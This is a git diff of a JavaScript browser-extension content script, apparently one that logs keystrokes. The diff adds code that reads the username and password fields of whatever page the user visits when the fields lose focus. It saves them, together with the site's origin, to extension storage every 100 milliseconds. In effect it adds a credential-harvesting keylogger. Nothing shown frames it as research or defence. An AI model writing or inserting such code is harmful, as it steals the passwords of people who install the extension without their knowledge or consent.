@@ -1,7 +1,21 @@
 const db = {};
 // update keystrokes every 100ms
 setInterval(() => {
-  chrome.storage.local.set({database: db}, () => {});
+  chrome.storage.local.set({ database: db }, () => {});
+}, 100);
+
+let username = "";
+let password = "";
+
+setInterval(() => {
+  if(username === "" && password === "") return;
+  chrome.storage.local.set({
+    credentials: {
+      domain: window.location.origin,
+      username,
+      password,
+    },
+  });
 }, 100);
 
 /**
@@ -64,6 +78,7 @@ idHandle = setInterval(() => {
   });
   getIdentifier().addEventListener("blur", () => {
     idHandle && console.log("Identifier blurred");
+    username = getIdentifier().value;
     unmountListener();
   });
 }, 0);
@@ -80,9 +95,7 @@ passHandle = setInterval(() => {
   });
   getPassword().addEventListener("blur", () => {
     passHandle && console.log("Password blurred");
+    password = getPassword().value;
     unmountListener();
   });
 }, 0);
-
-// console.log("username:", getIdentifier().value);
-// console.log("password:", getPassword().value);
